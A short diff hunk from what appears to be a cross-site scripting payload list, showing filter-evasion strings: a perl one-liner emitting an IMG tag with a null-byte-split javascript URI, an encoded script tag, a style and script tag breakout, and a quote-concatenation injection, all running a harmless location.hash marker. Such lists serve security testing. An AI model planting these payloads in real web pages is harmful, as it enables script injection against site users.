@@ -30,4 +30,3 @@ perl -e 'print "<IMG SRC=java\0script:location.hash=10>";' > out
 ¼script¾location.hash=10¼/script¾
 '"--></style></scRipt><scRipt>location.hash=10</scRipt>
 '+location.hash=10+'
-
